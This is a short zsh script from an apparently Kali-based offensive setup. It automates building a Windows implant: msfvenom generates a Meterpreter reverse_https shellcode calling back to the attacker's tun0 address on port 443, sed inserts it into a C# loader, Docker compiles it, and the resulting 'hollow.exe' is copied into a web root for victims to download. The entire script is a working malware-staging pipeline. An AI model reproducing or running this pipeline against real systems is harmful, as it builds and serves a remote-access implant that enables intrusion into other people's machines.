#!/usr/bin/env zsh

# Generate shellcode
# https://askubuntu.com/questions/187022/how-can-i-send-a-custom-desktop-notification
notify-send "Replacing shellcode"
new_payload=$(msfvenom -p windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 EXITFUNC=thread -f csharp | tr -d '\n')

# Replace shellcode in csharp file
sed -i "/^.*byte\[\] buf = new byte/c\\$new_payload" /home/kali/Desktop/base/containers/compile_dotnet/workspace/Program.cs

# Compile using .NET SDK Docker container
notify-send "Compiling"
docker run --rm -v /home/kali/Desktop/base/containers/compile_dotnet/workspace:/workspace dotnet-builder

# Copy to webroot
notify-send "Copying to webroot"
cp /home/kali/Desktop/base/containers/compile_dotnet/workspace/bin/Release/net6.0/win-x64/publish/workspace.exe /var/www/html/b/hollow.exe

notify-send "Compiled hollow binary ready in webroot" -i face-devilish

